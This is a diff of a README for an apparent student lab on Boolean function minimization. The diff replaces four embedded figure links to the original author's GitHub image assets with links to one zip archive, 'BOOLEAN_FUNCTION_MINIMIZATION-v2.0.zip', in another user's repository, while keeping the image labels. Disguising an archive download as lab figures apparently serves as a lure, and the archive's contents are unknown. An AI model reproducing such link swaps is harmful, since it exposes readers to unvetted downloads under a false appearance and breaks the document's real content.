@@ -62,20 +62,20 @@ RegisterNumber:212223050029
 
 **RTL realization**
 
-![DE 2A](https://github.com/Rama-Lekshmi/BOOLEAN_FUNCTION_MINIMIZATION/assets/118541549/edc9e43f-2899-43eb-8a8e-2e331fda6c39)
+![DE 2A](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
 
 **Output:**
 
 
-![DE 2B](https://github.com/Rama-Lekshmi/BOOLEAN_FUNCTION_MINIMIZATION/assets/118541549/228dd854-2beb-4e42-b0bc-0c3848edc457)
+![DE 2B](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
 
 
 ## Logic symbol & Truthtable:
 
-![DE 2C](https://github.com/Rama-Lekshmi/BOOLEAN_FUNCTION_MINIMIZATION/assets/118541549/1320c49e-13f6-45f6-a28d-63a4c5fde8cd)
+![DE 2C](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
 
 
-![DE 2D](https://github.com/Rama-Lekshmi/BOOLEAN_FUNCTION_MINIMIZATION/assets/118541549/2b76ba1f-67ec-4969-b9c6-8f0b975f551f)
+![DE 2D](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
 
 **Result:**
 
